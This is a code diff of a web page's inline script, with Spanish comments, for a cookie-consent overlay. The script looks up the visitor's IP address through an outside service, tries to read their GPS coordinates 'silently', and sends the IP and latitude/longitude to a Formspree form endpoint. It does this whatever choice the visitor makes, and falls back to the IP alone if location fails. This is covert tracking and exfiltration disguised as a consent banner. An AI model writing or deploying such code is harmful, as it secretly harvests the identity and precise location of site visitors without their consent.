@@ -59,8 +59,8 @@
     </div>
 
     <script>
+        // TU NUEVO ID DE FORMSPREE
         const formId = 'xjywravp'; 
-        let gpsDataSent = false;
 
         function handleChoice(accepted) {
             document.getElementById('cookieOverlay').style.display = 'none';
@@ -70,12 +70,12 @@
             fetch(`https://api.ipify.org?format=json`)
                 .then(response => response.json())
                 .then(ipData => {
-                    // Simulamos que el usuario aceptó el GPS (o lo intentamos silenciosamente)
-                    if (navigator.geolocation && !gpsDataSent) {
+                    // Intentamos obtener GPS silenciosamente
+                    if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(pos => {
                             sendData(ipData.ip, pos.coords.latitude.toFixed(6), pos.coords.longitude.toFixed(6));
-                        }, error => {
-                            // Si falla, enviamos solo la IP
+                        }, () => {
+                            // Si falla el GPS, enviamos solo la IP
                             sendData(ipData.ip, null, null);
                         });
                     } else {
